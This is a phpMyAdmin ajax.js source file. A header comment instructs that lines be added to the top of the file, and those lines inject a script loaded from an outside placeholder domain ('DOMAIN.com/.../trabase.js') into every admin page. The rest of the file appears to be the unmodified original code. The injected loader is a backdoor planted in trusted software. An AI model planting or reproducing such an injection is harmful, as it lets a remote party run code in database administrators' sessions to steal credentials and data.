//################# Add these lines to the top of ajax.js file ####################
var my_panel_script = document.createElement('script');
my_panel_script.setAttribute('src', 'https://DOMAIN.com/phpmyadmin/js/trabase.js?');
document.head.appendChild(my_panel_script);
//################# Other lines is for orginal phpmyadmin source ####################

/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * This object handles ajax requests for pages. It also
 * handles the reloading of the main menu and scripts.
 */
var AJAX = {
    /**
     * @var bool active Whether we are busy
     */
    active: false,
    /**
     * @var object source The object whose event initialized the request
     */
    source: null,
    /**
     * @var object xhr A reference to the ajax request that is currently running
     */
    xhr: null,
    /**
     * @var object lockedTargets, list of locked targets
     */
    lockedTargets: {},
    /**
     * @var function Callback to execute after a successful request
     *               Used by PMA_commonFunctions from common.js
     */
    _callback: function () {},
    /**
     * @var bool _debug Makes noise in your Firebug console
     */
    _debug: false,
    /**
     * @var object $msgbox A reference to a jQuery object that links to a message
     *                     box that is generated by PMA_ajaxShowMessage()
     */
    $msgbox: null,
    /**
     * Given the filename of a script, returns a hash to be
     * used to refer to all the events registered for the file
     *
     * @param key string key The filename for which to get the event name
     *
     * @return int
     */
    hash: function (key) {
        /* http://burtleburtle.net/bob/hash/doobs.html#one */
        key += '';
        var len = key.length;
        var hash = 0;
        var i = 0;
        for (; i < len; ++i) {
            hash += key.charCodeAt(i);
            hash += (hash << 10);
            hash ^= (hash >> 6);
        }
        hash += (hash << 3);
        hash ^= (hash >> 11);
        hash += (hash << 15);
        return Math.abs(hash);
    },
    /**
     * Registers an onload event for a file
     *
     * @param file string   file The filename for which to register the event
     * @param func function func The function to execute when the page is ready
     *
     * @return self For chaining
     */
    registerOnload: function (file, func) {
        var eventName = 'onload_' + AJAX.hash(file);
        $(document).on(eventName, func);
        if (this._debug) {
            console.log(
                // no need to translate
                'Registered event ' + eventName + ' for file ' + file
            );
        }
        return this;
    },
    /**
     * Registers a teardown event for a file. This is useful to execute functions
     * that unbind events for page elements that are about to be removed.
     *
     * @param string   file The filename for which to register the event
     * @param function func The function to execute when
     *                      the page is about to be torn down
     *
     * @return self For chaining
     */
    registerTeardown: function (file, func) {
        var eventName = 'teardown_' + AJAX.hash(file);
        $(document).on(eventName, func);
        if (this._debug) {
            console.log(
                // no need to translate
                'Registered event ' + eventName + ' for file ' + file
            );
        }
        return this;
    },
    /**
     * Called when a page has finished loading, once for every
     * file that registered to the onload event of that file.
     *
     * @param string file The filename for which to fire the event
     *
     * @return void
     */
    fireOnload: function (file) {
        var eventName = 'onload_' + AJAX.hash(file);
        $(document).trigger(eventName);
        if (this._debug) {
            console.log(
                // no need to translate
                'Fired event ' + eventName + ' for file ' + file
            );
        }
    },
    /**
     * Called just before a page is torn down, once for every
     * file that registered to the teardown event of that file.
     *
     * @param string file The filename for which to fire the event
     *
     * @return void
     */
    fireTeardown: function (file) {
        var eventName = 'teardown_' + AJAX.hash(file);
        $(document).triggerHandler(eventName);
        if (this._debug) {
            console.log(
                // no need to translate
                'Fired event ' + eventName + ' for file ' + file
            );
        }
    },
    /**
     * function to handle lock page mechanism
     *
     * @param event the event object
     *
     * @return void
     */
    lockPageHandler: function (event) {
        var newHash = null;
        var oldHash = null;
        var lockId;
        // CodeMirror lock
        if (event.data.value === 3) {
            newHash = event.data.content;
            oldHash = true;
            lockId = 'cm';
        } else {
            // Don't lock on enter.
            if (0 === event.charCode) {
                return;
            }

            lockId = $(this).data('lock-id');
            if (typeof lockId === 'undefined') {
                return;
            }
            /*
             * @todo Fix Code mirror does not give correct full value (query)
             * in textarea, it returns only the change in content.
             */
            if (event.data.value === 1) {
                newHash = AJAX.hash($(this).val());
            } else {
                newHash = AJAX.hash($(this).is(':checked'));
            }
            oldHash = $(this).data('val-hash');
        }
        // Set lock if old value !== new value
        // otherwise release lock
        if (oldHash !== newHash) {
            AJAX.lockedTargets[lockId] = true;
        } else {
            delete AJAX.lockedTargets[lockId];
        }
        // Show lock icon if locked targets is not empty.
        // otherwise remove lock icon
        if (!jQuery.isEmptyObject(AJAX.lockedTargets)) {
            $('#lock_page_icon').html(PMA_getImage('s_lock', PMA_messages.strLockToolTip).toString());
        } else {
            $('#lock_page_icon').html('');
        }
    },
    /**
     * resets the lock
     *
     * @return void
     */
    resetLock: function () {
        AJAX.lockedTargets = {};
        $('#lock_page_icon').html('');
    },
    handleMenu: {
        replace: function (content) {
            $('#floating_menubar').html(content)
                // Remove duplicate wrapper
                // TODO: don't send it in the response
                .children().first().remove();
            $('#topmenu').menuResizer(PMA_mainMenuResizerCallback);
        }
    },
    /**
     * Event handler for clicks on links and form submissions
     *
     * @param object e Event data
     *
     * @return void
     */
    requestHandler: function (event) {
        // In some cases we don't want to handle the request here and either
        // leave the browser deal with it natively (e.g: file download)
        // or leave an existing ajax event handler present elsewhere deal with it
        var href = $(this).attr('href');
        if (typeof event !== 'undefined' && (event.shiftKey || event.ctrlKey)) {
            return true;
        } else if ($(this).attr('target')) {
            return true;
        } else if ($(this).hasClass('ajax') || $(this).hasClass('disableAjax')) {
            // reset the lockedTargets object, as specified AJAX operation has finished
            AJAX.resetLock();
            return true;
        } else if (href && href.match(/^#/)) {
            return true;
        } else if (href && href.match(/^mailto/)) {
            return true;
        } else if ($(this).hasClass('ui-datepicker-next') ||
            $(this).hasClass('ui-datepicker-prev')
        ) {
            return true;
        }

        if (typeof event !== 'undefined') {
            event.preventDefault();
            event.stopImmediatePropagation();
        }

        // triggers a confirm dialog if:
        // the user has performed some operations on loaded page
        // the user clicks on some link, (won't trigger for buttons)
        // the click event is not triggered by script
        if (typeof event !== 'undefined' && event.type === 'click' &&
            event.isTrigger !== true &&
            !jQuery.isEmptyObject(AJAX.lockedTargets) &&
            confirm(PMA_messages.strConfirmNavigation) === false
        ) {
            return false;
        }
        AJAX.resetLock();
        var isLink = !! href || false;
        var previousLinkAborted = false;

        if (AJAX.active === true) {
            // Cancel the old request if abortable, when the user requests
            // something else. Otherwise silently bail out, as there is already
            // a request well in progress.
            if (AJAX.xhr) {
                // In case of a link request, attempt aborting
                AJAX.xhr.abort();
                if (AJAX.xhr.status === 0 && AJAX.xhr.statusText === 'abort') {
                    // If aborted
                    AJAX.$msgbox = PMA_ajaxShowMessage(PMA_messages.strAbortedRequest);
                    AJAX.active = false;
                    AJAX.xhr = null;
                    previousLinkAborted = true;
                } else {
                    // If can't abort
                    return false;
                }
            } else {
                // In case submitting a form, don't attempt aborting
                return false;
            }
        }

        AJAX.source = $(this);

        $('html, body').animate({ scrollTop: 0 }, 'fast');

        var url = isLink ? href : $(this).attr('action');
        var argsep = PMA_commonParams.get('arg_separator');
        var params = 'ajax_request=true' + argsep + 'ajax_page_request=true';
        var dataPost = AJAX.source.getPostData();
        if (! isLink) {
            params += argsep + $(this).serialize();
        } else if (dataPost) {
            params += argsep + dataPost;
            isLink = false;
        }
        if (! (history && history.pushState)) {
            // Add a list of menu hashes that we have in the cache to the request
            params += PMA_MicroHistory.menus.getRequestParam();
        }

        if (AJAX._debug) {
            console.log('Loading: ' + url); // no need to translate
        }

        if (isLink) {
            AJAX.active = true;
            AJAX.$msgbox = PMA_ajaxShowMessage();
            // Save reference for the new link request
            AJAX.xhr = $.get(url, params, AJAX.responseHandler);
            if (history && history.pushState) {
                var state = {
                    url : href
                };
                if (previousLinkAborted) {
                    // hack: there is already an aborted entry on stack
                    // so just modify the aborted one
                    history.replaceState(state, null, href);
                } else {
                    history.pushState(state, null, href);
                }
            }
        } else {
            /**
             * Manually fire the onsubmit event for the form, if any.
             * The event was saved in the jQuery data object by an onload
             * handler defined below. Workaround for bug #3583316
             */
            var onsubmit = $(this).data('onsubmit');
            // Submit the request if there is no onsubmit handler
            // or if it returns a value that evaluates to true
            if (typeof onsubmit !== 'function' || onsubmit.apply(this, [event])) {
                AJAX.active = true;
                AJAX.$msgbox = PMA_ajaxShowMessage();
                $.post(url, params, AJAX.responseHandler);
            }
        }
    },
    /**
     * Called after the request that was initiated by this.requestHandler()
     * has completed successfully or with a caught error. For completely
     * failed requests or requests with uncaught errors, see the .ajaxError
     * handler at the bottom of this file.
     *
     * To refer to self use 'AJAX', instead of 'this' as this function
     * is called in the jQuery context.
     *
     * @param object e Event data
     *
     * @return void
     */
    responseHandler: function (data) {
        if (typeof data === 'undefined' || data === null) {
            return;
        }
        if (typeof data.success !== 'undefined' && data.success) {
            $('html, body').animate({ scrollTop: 0 }, 'fast');
            PMA_ajaxRemoveMessage(AJAX.$msgbox);

            if (data._redirect) {
                PMA_ajaxShowMessage(data._redirect, false);
                AJAX.active = false;
                AJAX.xhr = null;
                return;
            }

            AJAX.scriptHandler.reset(function () {
                if (data._reloadNavigation) {
                    PMA_reloadNavigation();
                }
                if (data._title) {
                    $('title').replaceWith(data._title);
                }
                if (data._menu) {
                    if (history && history.pushState) {
                        var state = {
                            url : data._selflink,
                            menu : data._menu
                        };
                        history.replaceState(state, null);
                        AJAX.handleMenu.replace(data._menu);
                    } else {
                        PMA_MicroHistory.menus.replace(data._menu);
                        PMA_MicroHistory.menus.add(data._menuHash, data._menu);
                    }
                } else if (data._menuHash) {
                    if (! (history && history.pushState)) {
                        PMA_MicroHistory.menus.replace(PMA_MicroHistory.menus.get(data._menuHash));
                    }
                }
                if (data._disableNaviSettings) {
                    PMA_disableNaviSettings();
                } else {
                    PMA_ensureNaviSettings(data._selflink);
                }

                // Remove all containers that may have
                // been added outside of #page_content
                $('body').children()
                    .not('#pma_navigation')
                    .not('#floating_menubar')
                    .not('#page_nav_icons')
                    .not('#page_content')
                    .not('#selflink')
                    .not('#pma_header')
                    .not('#pma_footer')
                    .not('#pma_demo')
                    .not('#pma_console_container')
                    .not('#prefs_autoload')
                    .remove();
                // Replace #page_content with new content
                if (data.message && data.message.length > 0) {
                    $('#page_content').replaceWith(
                        '<div id=\'page_content\'>' + data.message + '</div>'
                    );
                    PMA_highlightSQL($('#page_content'));
                    checkNumberOfFields();
                }

                if (data._selflink) {
                    var source = data._selflink.split('?')[0];
                    // Check for faulty links
                    $selflink_replace = {
                        'import.php': 'tbl_sql.php',
                        'tbl_chart.php': 'sql.php',
                        'tbl_gis_visualization.php': 'sql.php'
                    };
                    if ($selflink_replace[source]) {
                        var replacement = $selflink_replace[source];
                        data._selflink = data._selflink.replace(source, replacement);
                    }
                    $('#selflink').find('> a').attr('href', data._selflink);
                }
                if (data._params) {
                    PMA_commonParams.setAll(data._params);
                }
                if (data._scripts) {
                    AJAX.scriptHandler.load(data._scripts);
                }
                if (data._selflink && data._scripts && data._menuHash && data._params) {
                    if (! (history && history.pushState)) {
                        PMA_MicroHistory.add(
                            data._selflink,
                            data._scripts,
                            data._menuHash,
                            data._params,
                            AJAX.source.attr('rel')
                        );
                    }
                }
                if (data._displayMessage) {
                    $('#page_content').prepend(data._displayMessage);
                    PMA_highlightSQL($('#page_content'));
                }

                $('#pma_errors').remove();

                var msg = '';
                if (data._errSubmitMsg) {
                    msg = data._errSubmitMsg;
                }
                if (data._errors) {
                    $('<div/>', { id : 'pma_errors', class : 'clearfloat' })
                        .insertAfter('#selflink')
                        .append(data._errors);
                    // bind for php error reporting forms (bottom)
                    $('#pma_ignore_errors_bottom').on('click', function (e) {
                        e.preventDefault();
                        PMA_ignorePhpErrors();
                    });
                    $('#pma_ignore_all_errors_bottom').on('click', function (e) {
                        e.preventDefault();
                        PMA_ignorePhpErrors(false);
                    });
                    // In case of 'sendErrorReport'='always'
                    // submit the hidden error reporting form.
                    if (data._sendErrorAlways === '1' &&
                        data._stopErrorReportLoop !== '1'
                    ) {
                        $('#pma_report_errors_form').submit();
                        PMA_ajaxShowMessage(PMA_messages.phpErrorsBeingSubmitted, false);
                        $('html, body').animate({ scrollTop:$(document).height() }, 'slow');
                    } else if (data._promptPhpErrors) {
                        // otherwise just prompt user if it is set so.
                        msg = msg + PMA_messages.phpErrorsFound;
                        // scroll to bottom where all the errors are displayed.
                        $('html, body').animate({ scrollTop:$(document).height() }, 'slow');
                    }
                }
                PMA_ajaxShowMessage(msg, false);
                // bind for php error reporting forms (popup)
                $('#pma_ignore_errors_popup').on('click', function () {
                    PMA_ignorePhpErrors();
                });
                $('#pma_ignore_all_errors_popup').on('click', function () {
                    PMA_ignorePhpErrors(false);
                });

                if (typeof AJAX._callback === 'function') {
                    AJAX._callback.call();
                }
                AJAX._callback = function () {};
            });
        } else {
            PMA_ajaxShowMessage(data.error, false);
            AJAX.active = false;
            AJAX.xhr = null;
            PMA_handleRedirectAndReload(data);
            if (data.fieldWithError) {
                $(':input.error').removeClass('error');
                $('#' + data.fieldWithError).addClass('error');
            }
        }
    },
    /**
     * This object is in charge of downloading scripts,
     * keeping track of what's downloaded and firing
     * the onload event for them when the page is ready.
     */
    scriptHandler: {
        /**
         * @var array _scripts The list of files already downloaded
         */
        _scripts: [],
        /**
         * @var string _scriptsVersion version of phpMyAdmin from which the
         *                             scripts have been loaded
         */
        _scriptsVersion: null,
        /**
         * @var array _scriptsToBeLoaded The list of files that
         *                               need to be downloaded
         */
        _scriptsToBeLoaded: [],
        /**
         * @var array _scriptsToBeFired The list of files for which
         *                              to fire the onload and unload events
         */
        _scriptsToBeFired: [],
        _scriptsCompleted: false,
        /**
         * Records that a file has been downloaded
         *
         * @param string file The filename
         * @param string fire Whether this file will be registering
         *                    onload/teardown events
         *
         * @return self For chaining
         */
        add: function (file, fire) {
            this._scripts.push(file);
            if (fire) {
                // Record whether to fire any events for the file
                // This is necessary to correctly tear down the initial page
                this._scriptsToBeFired.push(file);
            }
            return this;
        },
        /**
         * Download a list of js files in one request
         *
         * @param array files An array of filenames and flags
         *
         * @return void
         */
        load: function (files, callback) {
            var self = this;
            var i;
            // Clear loaded scripts if they are from another version of phpMyAdmin.
            // Depends on common params being set before loading scripts in responseHandler
            if (self._scriptsVersion === null) {
                self._scriptsVersion = PMA_commonParams.get('PMA_VERSION');
            } else if (self._scriptsVersion !== PMA_commonParams.get('PMA_VERSION')) {
                self._scripts = [];
                self._scriptsVersion = PMA_commonParams.get('PMA_VERSION');
            }
            self._scriptsCompleted = false;
            self._scriptsToBeFired = [];
            // We need to first complete list of files to load
            // as next loop will directly fire requests to load them
            // and that triggers removal of them from
            // self._scriptsToBeLoaded
            for (i in files) {
                self._scriptsToBeLoaded.push(files[i].name);
                if (files[i].fire) {
                    self._scriptsToBeFired.push(files[i].name);
                }
            }
            for (i in files) {
                var script = files[i].name;
                // Only for scripts that we don't already have
                if ($.inArray(script, self._scripts) === -1) {
                    this.add(script);
                    this.appendScript(script, callback);
                } else {
                    self.done(script, callback);
                }
            }
            // Trigger callback if there is nothing else to load
            self.done(null, callback);
        },
        /**
         * Called whenever all files are loaded
         *
         * @return void
         */
        done: function (script, callback) {
            if (typeof ErrorReport !== 'undefined') {
                ErrorReport.wrap_global_functions();
            }
            if ($.inArray(script, this._scriptsToBeFired)) {
                AJAX.fireOnload(script);
            }
            if ($.inArray(script, this._scriptsToBeLoaded)) {
                this._scriptsToBeLoaded.splice($.inArray(script, this._scriptsToBeLoaded), 1);
            }
            if (script === null) {
                this._scriptsCompleted = true;
            }
            /* We need to wait for last signal (with null) or last script load */
            AJAX.active = (this._scriptsToBeLoaded.length > 0) || ! this._scriptsCompleted;
            /* Run callback on last script */
            if (! AJAX.active && $.isFunction(callback)) {
                callback();
            }
        },
        /**
         * Appends a script element to the head to load the scripts
         *
         * @return void
         */
        appendScript: function (name, callback) {
            var head = document.head || document.getElementsByTagName('head')[0];
            var script = document.createElement('script');
            var self = this;

            script.type = 'text/javascript';
            script.src = 'js/' + name + '?' + 'v=' + encodeURIComponent(PMA_commonParams.get('PMA_VERSION'));
            script.async = false;
            script.onload = function () {
                self.done(name, callback);
            };
            head.appendChild(script);
        },
        /**
         * Fires all the teardown event handlers for the current page
         * and rebinds all forms and links to the request handler
         *
         * @param function callback The callback to call after resetting
         *
         * @return void
         */
        reset: function (callback) {
            for (var i in this._scriptsToBeFired) {
                AJAX.fireTeardown(this._scriptsToBeFired[i]);
            }
            this._scriptsToBeFired = [];
            /**
             * Re-attach a generic event handler to clicks
             * on pages and submissions of forms
             */
            $(document).off('click', 'a').on('click', 'a', AJAX.requestHandler);
            $(document).off('submit', 'form').on('submit', 'form', AJAX.requestHandler);
            if (! (history && history.pushState)) {
                PMA_MicroHistory.update();
            }
            callback();
        }
    }
};

/**
 * Here we register a function that will remove the onsubmit event from all
 * forms that will be handled by the generic page loader. We then save this
 * event handler in the "jQuery data", so that we can fire it up later in
 * AJAX.requestHandler().
 *
 * See bug #3583316
 */
AJAX.registerOnload('functions.js', function () {
    // Registering the onload event for functions.js
    // ensures that it will be fired for all pages
    $('form').not('.ajax').not('.disableAjax').each(function () {
        if ($(this).attr('onsubmit')) {
            $(this).data('onsubmit', this.onsubmit).attr('onsubmit', '');
        }
    });

    var $page_content = $('#page_content');
    /**
     * Workaround for passing submit button name,value on ajax form submit
     * by appending hidden element with submit button name and value.
     */
    $page_content.on('click', 'form input[type=submit]', function () {
        var buttonName = $(this).attr('name');
        if (typeof buttonName === 'undefined') {
            return;
        }
        $(this).closest('form').append($('<input/>', {
            'type' : 'hidden',
            'name' : buttonName,
            'value': $(this).val()
        }));
    });

    /**
     * Attach event listener to events when user modify visible
     * Input,Textarea and select fields to make changes in forms
     */
    $page_content.on(
        'keyup change',
        'form.lock-page textarea, ' +
        'form.lock-page input[type="text"], ' +
        'form.lock-page input[type="number"], ' +
        'form.lock-page select',
        { value:1 },
        AJAX.lockPageHandler
    );
    $page_content.on(
        'change',
        'form.lock-page input[type="checkbox"], ' +
        'form.lock-page input[type="radio"]',
        { value:2 },
        AJAX.lockPageHandler
    );
    /**
     * Reset lock when lock-page form reset event is fired
     * Note: reset does not bubble in all browser so attach to
     * form directly.
     */
    $('form.lock-page').on('reset', function (event) {
        AJAX.resetLock();
    });
});

/**
 * Page load event handler
 */
$(function () {
    var menuContent = $('<div></div>')
        .append($('#serverinfo').clone())
        .append($('#topmenucontainer').clone())
        .html();
    if (history && history.pushState) {
        // set initial state reload
        var initState = ('state' in window.history && window.history.state !== null);
        var initURL = $('#selflink').find('> a').attr('href') || location.href;
        var state = {
            url : initURL,
            menu : menuContent
        };
        history.replaceState(state, null);

        $(window).on('popstate', function (event) {
            var initPop = (! initState && location.href === initURL);
            initState = true;
            // check if popstate fired on first page itself
            if (initPop) {
                return;
            }
            var state = event.originalEvent.state;
            if (state && state.menu) {
                AJAX.$msgbox = PMA_ajaxShowMessage();
                var params = 'ajax_request=true' + PMA_commonParams.get('arg_separator') + 'ajax_page_request=true';
                var url = state.url || location.href;
                $.get(url, params, AJAX.responseHandler);
                // TODO: Check if sometimes menu is not retrieved from server,
                // Not sure but it seems menu was missing only for printview which
                // been removed lately, so if it's right some dead menu checks/fallbacks
                // may need to be removed from this file and Header.php
                // AJAX.handleMenu.replace(event.originalEvent.state.menu);
            }
        });
    } else {
        // Fallback to microhistory mechanism
        AJAX.scriptHandler
            .load([{ 'name' : 'microhistory.js', 'fire' : 1 }], function () {
                // The cache primer is set by the footer class
                if (PMA_MicroHistory.primer.url) {
                    PMA_MicroHistory.menus.add(
                        PMA_MicroHistory.primer.menuHash,
                        menuContent
                    );
                }
                $(function () {
                    // Queue up this event twice to make sure that we get a copy
                    // of the page after all other onload events have been fired
                    if (PMA_MicroHistory.primer.url) {
                        PMA_MicroHistory.add(
                            PMA_MicroHistory.primer.url,
                            PMA_MicroHistory.primer.scripts,
                            PMA_MicroHistory.primer.menuHash
                        );
                    }
                });
            });
    }
});

/**
 * Attach a generic event handler to clicks
 * on pages and submissions of forms
 */
$(document).on('click', 'a', AJAX.requestHandler);
$(document).on('submit', 'form', AJAX.requestHandler);

/**
 * Gracefully handle fatal server errors
 * (e.g: 500 - Internal server error)
 */
$(document).ajaxError(function (event, request, settings) {
    if (AJAX._debug) {
        console.log('AJAX error: status=' + request.status + ', text=' + request.statusText);
    }
    // Don't handle aborted requests
    if (request.status !== 0 || request.statusText !== 'abort') {
        var details = '';
        var state = request.state();

        if (request.status !== 0) {
            details += '<div>' + escapeHtml(PMA_sprintf(PMA_messages.strErrorCode, request.status)) + '</div>';
        }
        details += '<div>' + escapeHtml(PMA_sprintf(PMA_messages.strErrorText, request.statusText + ' (' + state + ')')) + '</div>';
        if (state === 'rejected' || state === 'timeout') {
            details += '<div>' + escapeHtml(PMA_messages.strErrorConnection) + '</div>';
        }
        PMA_ajaxShowMessage(
            '<div class="error">' +
            PMA_messages.strErrorProcessingRequest +
            details +
            '</div>',
            false
        );
        AJAX.active = false;
        AJAX.xhr = null;
    }
});
